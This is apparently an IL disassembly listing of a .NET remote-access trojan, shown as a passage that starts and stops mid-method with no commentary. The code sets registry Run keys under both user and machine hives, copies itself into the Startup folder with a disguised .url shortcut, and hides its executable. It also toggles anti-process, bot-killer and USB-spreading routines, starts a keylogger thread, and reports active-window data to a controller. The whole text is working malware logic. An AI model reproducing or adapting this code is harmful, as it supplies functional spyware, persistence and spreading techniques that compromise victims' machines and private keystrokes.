      IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0169:  leave.s    IL_016b

    }  // end handler
    IL_016b:  nop
    .try
    {
      IL_016c:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0171:  ldstr      "1"
      IL_0176:  ldc.i4.1
      IL_0177:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_017c:  leave.s    IL_0197

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_017e:  dup
      IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0184:  stloc.2
      IL_0185:  ldloc.2
      IL_0186:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0190:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0195:  leave.s    IL_0197

    }  // end handler
    IL_0197:  ldsfld     bool j.OK::Isu
    IL_019c:  brfalse    IL_0254

    .try
    {
      IL_01a1:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01a6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01ab:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01b0:  ldsfld     string j.OK::sf
      IL_01b5:  ldc.i4.1
      IL_01b6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01bb:  ldsfld     string j.OK::RG
      IL_01c0:  ldstr      "\""
      IL_01c5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01ca:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01cf:  ldstr      "\" .."
      IL_01d4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01d9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01de:  leave.s    IL_01f9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e0:  dup
      IL_01e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e6:  stloc.3
      IL_01e7:  ldloc.3
      IL_01e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f7:  leave.s    IL_01f9

    }  // end handler
    IL_01f9:  nop
    .try
    {
      IL_01fa:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01ff:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0204:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0209:  ldsfld     string j.OK::sf
      IL_020e:  ldc.i4.1
      IL_020f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0214:  ldsfld     string j.OK::RG
      IL_0219:  ldstr      "\""
      IL_021e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0223:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0228:  ldstr      "\" .."
      IL_022d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0232:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0237:  leave.s    IL_0254

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0239:  dup
      IL_023a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023f:  stloc.s    V_4
      IL_0241:  ldloc.s    V_4
      IL_0243:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0248:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0252:  leave.s    IL_0254

    }  // end handler
    IL_0254:  ldsfld     bool j.OK::IsF
    IL_0259:  brfalse    IL_0437

    .try
    {
      IL_025e:  ldc.i4.7
      IL_025f:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0264:  ldstr      "\\"
      IL_0269:  ldsfld     string j.OK::RG
      IL_026e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0273:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0278:  brfalse.s  IL_0294

      IL_027a:  ldc.i4.7
      IL_027b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0280:  ldstr      "\\"
      IL_0285:  ldsfld     string j.OK::RG
      IL_028a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_028f:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0294:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0299:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029e:  ldc.i4.7
      IL_029f:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02a4:  ldstr      "\\"
      IL_02a9:  ldsfld     string j.OK::RG
      IL_02ae:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02b3:  ldc.i4.1
      IL_02b4:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_02b9:  ldc.i4.7
      IL_02ba:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02bf:  ldstr      "\\"
      IL_02c4:  ldsfld     string j.OK::RG
      IL_02c9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ce:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_02d3:  stloc.s    V_5
      IL_02d5:  ldc.i4.7
      IL_02d6:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02db:  ldstr      "\\"
      IL_02e0:  ldloc.s    V_5
      IL_02e2:  ldstr      ".url"
      IL_02e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02ec:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_02f1:  brfalse.s  IL_030f

      IL_02f3:  ldc.i4.7
      IL_02f4:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02f9:  ldstr      "\\"
      IL_02fe:  ldloc.s    V_5
      IL_0300:  ldstr      ".url"
      IL_0305:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_030a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_030f:  ldc.i4.7
      IL_0310:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0315:  ldstr      "\\"
      IL_031a:  ldsfld     string j.OK::RG
      IL_031f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0324:  stloc.s    V_6
      IL_0326:  ldc.i4.7
      IL_0327:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_032c:  ldstr      "\\"
      IL_0331:  ldloc.s    V_5
      IL_0333:  ldstr      ".url"
      IL_0338:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_033d:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
      IL_0342:  stloc.s    V_7
      .try
      {
        IL_0344:  ldloc.s    V_6
        IL_0346:  ldc.i4.2
        IL_0347:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_034c:  ldloc.s    V_7
        IL_034e:  ldnull
        IL_034f:  ldstr      "WriteLine"
        IL_0354:  ldc.i4.1
        IL_0355:  newarr     [mscorlib]System.Object
        IL_035a:  dup
        IL_035b:  ldc.i4.0
        IL_035c:  ldstr      "[InternetShortcut]"
        IL_0361:  stelem.ref
        IL_0362:  ldnull
        IL_0363:  ldnull
        IL_0364:  ldnull
        IL_0365:  ldc.i4.1
        IL_0366:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_036b:  pop
        IL_036c:  ldloc.s    V_7
        IL_036e:  ldnull
        IL_036f:  ldstr      "WriteLine"
        IL_0374:  ldc.i4.1
        IL_0375:  newarr     [mscorlib]System.Object
        IL_037a:  dup
        IL_037b:  ldc.i4.0
        IL_037c:  ldstr      "URL=file:///"
        IL_0381:  ldloc.s    V_6
        IL_0383:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0388:  stelem.ref
        IL_0389:  ldnull
        IL_038a:  ldnull
        IL_038b:  ldnull
        IL_038c:  ldc.i4.1
        IL_038d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0392:  pop
        IL_0393:  ldloc.s    V_7
        IL_0395:  ldnull
        IL_0396:  ldstr      "WriteLine"
        IL_039b:  ldc.i4.1
        IL_039c:  newarr     [mscorlib]System.Object
        IL_03a1:  dup
        IL_03a2:  ldc.i4.0
        IL_03a3:  ldstr      "IconIndex=17"
        IL_03a8:  stelem.ref
        IL_03a9:  ldnull
        IL_03aa:  ldnull
        IL_03ab:  ldnull
        IL_03ac:  ldc.i4.1
        IL_03ad:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03b2:  pop
        IL_03b3:  ldloc.s    V_7
        IL_03b5:  ldnull
        IL_03b6:  ldstr      "WriteLine"
        IL_03bb:  ldc.i4.1
        IL_03bc:  newarr     [mscorlib]System.Object
        IL_03c1:  dup
        IL_03c2:  ldc.i4.0
        IL_03c3:  ldstr      "IconFile=C:\\Windows\\system32\\SHELL32.dll"
        IL_03c8:  stelem.ref
        IL_03c9:  ldnull
        IL_03ca:  ldnull
        IL_03cb:  ldnull
        IL_03cc:  ldc.i4.1
        IL_03cd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03d2:  pop
        IL_03d3:  ldloc.s    V_7
        IL_03d5:  ldnull
        IL_03d6:  ldstr      "Flush"
        IL_03db:  ldc.i4.0
        IL_03dc:  newarr     [mscorlib]System.Object
        IL_03e1:  ldnull
        IL_03e2:  ldnull
        IL_03e3:  ldnull
        IL_03e4:  ldc.i4.1
        IL_03e5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03ea:  pop
        IL_03eb:  leave.s    IL_03fe

      }  // end .try
      finally
      {
        IL_03ed:  ldloc.s    V_7
        IL_03ef:  brfalse.s  IL_03fd

        IL_03f1:  ldloc.s    V_7
        IL_03f3:  castclass  [mscorlib]System.IDisposable
        IL_03f8:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_03fd:  endfinally
      }  // end handler
      IL_03fe:  ldsfld     bool j.OK::HIDE_ME
      IL_0403:  box        [mscorlib]System.Boolean
      IL_0408:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_040d:  brfalse.s  IL_041a

      IL_040f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0414:  ldc.i4.2
      IL_0415:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_041a:  leave.s    IL_0437

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_041c:  dup
      IL_041d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0422:  stloc.s    V_8
      IL_0424:  ldloc.s    V_8
      IL_0426:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_042b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0430:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0435:  leave.s    IL_0437

    }  // end handler
    IL_0437:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       979 (0x3d3)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  ldsfld     string j.OK::SLP
    IL_0005:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
    IL_000a:  ldc.r8     1000.
    IL_0013:  mul
    IL_0014:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0019:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_001e:  conv.ovf.i4
    IL_001f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0024:  ldsfld     bool j.OK::Anti_CH
    IL_0029:  brfalse.s  IL_003e

    .try
    {
      IL_002b:  call       void MyAntiProcess::Start()
      IL_0030:  leave.s    IL_003e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0032:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003c:  leave.s    IL_003e

    }  // end handler
    IL_003e:  ldsfld     bool j.OK::BOT_KILL
    IL_0043:  brfalse.s  IL_005f

    .try
    {
      IL_0045:  call       void BotKillers::RunStandardBotKiller()
      IL_004a:  ldc.i4.s   50
      IL_004c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0051:  leave.s    IL_005f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005d:  leave.s    IL_005f

    }  // end handler
    IL_005f:  ldsfld     bool j.OK::USB_SP
    IL_0064:  brfalse.s  IL_0079

    .try
    {
      IL_0066:  call       void spredusb::Start()
      IL_006b:  leave.s    IL_0079

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0077:  leave.s    IL_0079

    }  // end handler
    IL_0079:  ldsfld     bool j.OK::Persis
    IL_007e:  brfalse.s  IL_0093

    .try
    {
      IL_0080:  call       void Persistence::Startup()
      IL_0085:  leave.s    IL_0093

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0091:  leave.s    IL_0093

    }  // end handler
    IL_0093:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0098:  brfalse.s  IL_00dd

    .try
    {
      IL_009a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_009f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00a4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00a9:  ldstr      "di"
      IL_00ae:  ldstr      "!"
      IL_00b3:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00b8:  leave.s    IL_00d3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ba:  dup
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  stloc.3
      IL_00c1:  ldloc.3
      IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d1:  leave.s    IL_00d3

    }  // end handler
    IL_00d3:  ldc.i4     0x1388
    IL_00d8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00dd:  ldc.i4.0
    IL_00de:  stloc.0
    IL_00df:  ldc.i4.1
    IL_00e0:  ldsfld     string j.OK::RG
    IL_00e5:  ldloca.s   V_0
    IL_00e7:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_00ec:  stsfld     object j.OK::MT
    IL_00f1:  ldloc.0
    IL_00f2:  brtrue.s   IL_00f9

    IL_00f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00f9:  call       void j.OK::INS()
    IL_00fe:  ldsfld     bool j.OK::Idr
    IL_0103:  brtrue.s   IL_0128

    IL_0105:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_010a:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_010f:  stsfld     string j.OK::EXE
    IL_0114:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0119:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_011e:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0123:  stsfld     string j.OK::DR
    IL_0128:  ldnull
    IL_0129:  ldftn      void j.OK::RC()
    IL_012f:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0134:  ldc.i4.1
    IL_0135:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_013a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_013f:  newobj     instance void j.kl::.ctor()
      IL_0144:  stsfld     class j.kl j.OK::kq
      IL_0149:  ldsfld     class j.kl j.OK::kq
      IL_014e:  ldftn      instance void j.kl::WRK()
      IL_0154:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0159:  ldc.i4.1
      IL_015a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_015f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0164:  leave.s    IL_0181

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0166:  dup
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016c:  stloc.s    V_4
      IL_016e:  ldloc.s    V_4
      IL_0170:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017f:  leave.s    IL_0181

    }  // end handler
    IL_0181:  ldc.i4.0
    IL_0182:  stloc.1
    IL_0183:  ldstr      ""
    IL_0188:  stloc.2
    IL_0189:  ldsfld     bool j.OK::BD
    IL_018e:  brfalse.s  IL_01c4

    .try
    {
      IL_0190:  ldnull
      IL_0191:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0197:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_019c:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_01a1:  ldc.i4.1
      IL_01a2:  call       void j.OK::pr(int32)
      IL_01a7:  leave.s    IL_01c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01a9:  dup
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01af:  stloc.s    V_5
      IL_01b1:  ldloc.s    V_5
      IL_01b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c2:  leave.s    IL_01c4

    }  // end handler
    IL_01c4:  ldc.i4     0x3e8
    IL_01c9:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01ce:  ldsfld     bool j.OK::Cn
    IL_01d3:  brtrue.s   IL_01db

    IL_01d5:  ldstr      ""
    IL_01da:  stloc.2
    IL_01db:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01e0:  ldloc.1
      IL_01e1:  ldc.i4.1
      IL_01e2:  add.ovf
      IL_01e3:  stloc.1
      IL_01e4:  ldloc.1
      IL_01e5:  ldc.i4.5
      IL_01e6:  bne.un.s   IL_0219

      .try
      {
        IL_01e8:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01ed:  ldc.i4     0x400
        IL_01f2:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01f7:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01fc:  leave.s    IL_0219

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01fe:  dup
        IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0204:  stloc.s    V_6
        IL_0206:  ldloc.s    V_6
        IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_020d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0212:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0217:  leave.s    IL_0219

      }  // end handler
      IL_0219:  ldloc.1
      IL_021a:  ldc.i4.8
      IL_021b:  blt.s      IL_024b

      IL_021d:  ldc.i4.0
      IL_021e:  stloc.1
      IL_021f:  call       string j.OK::ACT()
      IL_0224:  stloc.s    V_7
      IL_0226:  ldloc.2
      IL_0227:  ldloc.s    V_7
      IL_0229:  ldc.i4.0
      IL_022a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_022f:  brfalse.s  IL_024b

      IL_0231:  ldloc.s    V_7
      IL_0233:  stloc.2
      IL_0234:  ldstr      "act"
      IL_0239:  ldsfld     string j.OK::Y
      IL_023e:  ldloc.s    V_7
      IL_0240:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0245:  call       bool j.OK::Send(string)
      IL_024a:  pop
      IL_024b:  ldsfld     bool j.OK::Isu
      IL_0250:  brfalse    IL_03b0

      .try
      {
        IL_0255:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_025a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_025f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0264:  ldsfld     string j.OK::sf
        IL_0269:  ldstr      "\\"
        IL_026e:  ldsfld     string j.OK::RG
        IL_0273:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0278:  ldstr      ""
        IL_027d:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0282:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0287:  ldstr      "\""
        IL_028c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0291:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0296:  ldstr      "\" .."
        IL_029b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02a0:  ldc.i4.0
        IL_02a1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02a6:  brfalse.s  IL_02e5

        IL_02a8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02ad:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02b2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02b7:  ldsfld     string j.OK::sf
        IL_02bc:  ldc.i4.1
        IL_02bd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02c2:  ldsfld     string j.OK::RG
        IL_02c7:  ldstr      "\""
